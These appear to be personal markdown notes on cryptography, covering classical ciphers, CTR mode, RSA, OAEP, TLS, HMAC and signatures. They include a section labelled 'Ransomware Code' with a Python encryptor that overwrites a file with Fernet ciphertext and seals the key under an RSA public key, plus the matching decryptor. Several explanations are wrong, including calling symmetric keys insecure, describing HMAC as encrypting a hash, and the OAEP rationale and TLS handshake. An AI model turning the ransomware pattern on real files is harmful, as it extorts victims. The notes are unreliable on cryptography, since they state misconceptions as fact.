## Insecure Block Cipher

### Ceaser cipher
Ceaser cipher shifts the alphabets a given number of times and maps the resulting alphabets to the orderly alphabets.
*eg. a --> b, d -> e (key: 1)*
#### Catch
- only 26 unique keys available, so easy to crack.

### One-time Pad
One time pad method converts the plain text and the encryption key to its binary representatives and XORs them yielding a new binary code representing Gibberish.
#### Catch
- Number of letters in encryption key is visible.
- Encryption key and the message has to have equal number of characters. 
 
### PseudoRandom Generators (PRG)
This overcomes the Limitations of onetime pad method. It allows to the user to use a shorter key to encrypt a long document.

***
## Secure Block Ciphers
### Counter mode block ciphers (CTR)
#### Nonce (Number used Only once):
This is randomly generated characters for each message/plain text and so stays the same for all the divided blocks in that message.

#### Counter:
This is also randomly generated characters but increases subsequently (mostly by 1) for each consecutive divided blocks. 
Counter is added at the end of the  for each block and is somehow merged with the key and then XORed with the message.	

==nonce + counter = randomness
(key + randomness) ^ plain text = encrypted message (secure with no key repetition)==

***
>***A good cryptosystem is one in which all the security is inherent in knowledge of the key and none is inherent in knowledge of the algorithm.

# Symmetric algorithm 
## Symmetric Key
This key can be used for both encryption and decryption, although insecure as it is, it does allow for faster ciphering process.

## Types of Symmetric algorithm
### Stream ciphers
Operate on plain text ***one bit at a time***
### Block ciphers
Operate on plain text in ***group of bits at a time***

Total keys used for n pair of users in a network is calculated with
$$n(n-1)/2$$

# Asymmetric encryption

## Public Key Cryptography
### The RSA (Ron Rivest-Adi Shamir-Leonard Adleman)

>***This is a really clever way of encrypting a message, It's full functions is yet to be understood by the author. But for now its safe to say the he is qualified to tell you as much as he tells you and not a single letter after that.

The idea is to chose two randomly gigantic prime numbers,
	***say p and q are those prime numbers.***
 
and find its product,
$$ n = pq$$
we also have to find the total number of relative prime number within ***p*** and ***q***: 
==(relative prime number are a pair of numbers that do not share any common factors other than one and itself.)==
$$ Φ(n) = (p-1)(q-1)  $$
now chose ***e*** and ***d***:
	  chose ***e*** such that it's ==lesser than n== and ==relatively prime to Φ(n)==
now find out ***d*** with
$$ ed * mod(Φ(n)) = 1 $$
With these chosen variables we can generate a public and a private key, like
	==public key --> ***(e,n)*** and private key --> ***d***==
Public keys are publicly shared for the users to encrypt their texts but those encrypted texts can be decrypted only with the help of the private key d.

#### Encryption
*Let x = encrypted message and m = plain message,*
$$ x = m^e * mod(n) $$
#### Decryption
Taking ***x*** and raising it to the ***d*** key will spit out the original plain message
$$ m = x^d * mod(n) $$
#### Proof
If someone encrypts a message with my public key ***e*** and send it to me. 
I will raise it to my private key ***d***
$$ x^d = (m^e)^d = m^{ed} $$
since,
$$ ed - 1 = k(Φ(n)) => ed = k(Φ(n)) + 1 $$
Therefore,

$$ m^{ed} = m^{k(Φ(n)+1)} = (m^{Φ(n)})^k * m = (1)^k * m => m $$
which yields the plain message.

### Optimal Asymmetric Encryption Padding (OAEP)
Plain RSA encoding isn't secure as different messages will be encrypted using the same public key ***e***.
So OAEP adds **nonce** and **padding** to the message before its RSA encrypted and removes it before decrypting.

---
## Ransomware Code
### Encryptor
```python
# IMPORTS
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet

symmetricKey = Fernet.generate_key()
fernet = Fernet(symmetricKey)

# IMPORTING THE PUBLIC KEY FROM LOCAL STORAGE
with open('./pub.key','rb') as keyFile:
    pubKey = serialization.load_pem_public_key(
            keyFile.read(),
            backend = default_backend()
            )

# ENCRYPTING THE SYMMETRIC KEY WITH THE IMPORTED PUBLIC KEY
encryptedSymmetricKey = pubKey.encrypt(
        symmetricKey,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label = None
            )
        )

# WRITING THE ENCRYPTED SYMMETRIC KEY TO LOCAL STORAGE
with open('./encryptedSym.key','wb') as outKeyFile:
    outKeyFile.write(encryptedSymmetricKey)

# IMPORTING THE PLAIN-TEXT MESSAGE
with open('./text','rb') as textFile:
    message = textFile.read()

# ENCRYPTING THE MESSAGE WITH THE SYMMETRIC KEY
encryptedMessage = fernet.encrypt(message)

# WRITING THE ENCRYPTED MESSAGE OVER THE PLAIN-TEXT MESSAGE FILE
with open('./text','wb') as outTextFile:
    outTextFile.write(encryptedMessage)
```
### Decryptor
```python
# IMPORTS
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import padding

# IMPORTING THE ENCRYPTED SYMMETRIC KEY
with open('./encryptedSym.key','rb') as symFile:
    encryptedSym = symFile.read()
# IMPORTING THE PRIVATE KEY
with open('./.priv.key','rb') as privKeyFile:
    privKeyData = privKeyFile.read()

# LOADING THE PRIVATE KEY
privKey = serialization.load_pem_private_key(
        privKeyData,
        backend = default_backend(),
        password = None
        )

# DECYRPTING THE SYMMETRIC KEY WITH THE PRIVATE KEY
symmetricKey = privKey.decrypt(
        encryptedSym,
        padding.OAEP(
            mgf = padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label = None
            )
        )
fernet = Fernet(symmetricKey)

# IMPORTING THE ENCRYPTED MESSAGE
with open('./text','rb') as textFile:
    encryptedMessage = textFile.read()

# DECRYPTING THE MESSAGE WITH THE SYMMETRIC KEY
decryptedMessage = fernet.decrypt(encryptedMessage)

# WRITING THE PLAIN-TEXT MESSAGE OVER THE ENCRYPTED MESSAGE IN LOCAL STORAGE
with open('./text','wb') as outTextFile:
    outTextFile.write(decryptedMessage)
```

---
### Ciphering with public key
Ciphering with the public key can be considered as encryption as the only party with the private key can decrypt and read the message.
Anyone can obtain your public key and encrypt their message with it and send it to you, so only you can read and no one else can decipher it.
### Ciphering with private key
This can be viewed as signing the message as it does not proving any encryption, since public keys are publicly available and anyone can obtain it and decrypt the message.

The real use of signing a message with private key is to provide authenticity. Only the sender can wield the private key and ==***no one else should***==, so if the decryption with the sender's public key doesn't produce gibberish, this we can know for sure it came from that Guy/Gal.

---
## Transport Layer Security
There are two encryption methods:
- Symmetric encryption   ---> One key, Faster to cipher, but not so secure.
- Asymmetric encryption ---> Two keys, Slower to cipher, but really secure.

As they both have their ups and downs, TLS uses both of these methods for faster ciphering and secure transfer of data over the internet. ***HTTPS relies on TLS for secure data transfer***

### TLS Handshake
The client and the server needs to send one message each.
Client  ---> Client hello message (client public key with its certificate and nonce)
Server ---> Server Hello Message (server public key with its certificate and nonce)

And now, they can transfer data securely.

### Alex needs to communicate with Alice
- Alex sends over his public key, with a certificate showing that he owns that public key, to Alice,
- Alice too sends her public key, with a certificate, to Alex,
- Both now have their own private key and each other's public key, which they use to compute a singular secret **Symmetric key**,
- All their future communications are encrypted and decrypted using this secret symmetric key.
==So TLS borrows the secure key transfer from asymmetric encryption and inherits the faster ciphering traits from symmetric encryption.==

*Now both parties can transfer sensitive data safely. Although a hacker cannot know what the data actually is, he can still tamper the encrypted data bits resulting in a different data for the receiver.*
### Message Authentication
#### Hashing
Hashing, a.k.a message digest, is a one-way process, meaning it cannot be deciphered back to the original plain-text. Given a particular text, hashing it provides a unique fixed-length string which changes dramatically even with the tiniest changes in the original plain-text.

Since, hashes too can be modified during transit. TLS uses ***HMAC*** to verify if the data is harmed, if it is so, then that packet is dropped and is requested for a resend.
**HMAC --> Hash-based Message Authentication Codes** is a hashing function that uses a hashing algorithm (eg. SHA256)

The **HMAC** function takes the hash of the message and the secret symmetric key as the input and ***outputs a signed hash or a MAC value***

$$ HMAC(SymKey,message) = Encrypt(SymKey,Hash(message))= SignedHash/MACval$$


Now, The SignedHash or MAC value is added at the end with the Encrypted Message and is sent to the client.

$$ Message = EncryptedData + SignedHash $$
### Signatures
To obtain the signature of a certificate as to claim it, one must first hash the certificate and then encrypt the hash with their **Private Key** 

$$ Sign(pKey, Certificate) = Encrypt(pKey, Hash(Certificate)) = SignedCertificate $$

*To verify the Message/Certificate is original and not tampered, the client decrypts the encrypted message with the server's public key and the signed hash with the symmetric key.*

*Then we recompute the hash for the plain-text Message/Certificate. 
If the decrypted hash is the same as the recomputed hash, then the data is authentic.*









